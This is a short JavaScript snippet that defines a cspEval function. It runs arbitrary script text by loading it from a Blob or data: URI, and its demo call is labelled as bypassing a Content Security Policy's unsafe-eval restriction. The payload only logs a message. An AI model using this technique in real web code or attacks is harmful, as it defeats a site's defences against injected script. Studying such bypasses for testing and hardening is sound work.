function cspEval(js) {
    var script = document.createElement("script")

    // No Blob ? No CSP !
    if(Blob) {
        var blob = new Blob([js], {"type": "application/javascript"})
        script.src = URL.createObjectURL(blob)
    } else {
        var dataUri = "data:application/javascript," + js
        script.src = dataUri
    }

    var callback = function() { document.body.appendChild(script) }
    document.readyState === "complete" ? callback() : window.onload = callback

}

cspEval("console.log('Bypass CSP unsafe-eval')")
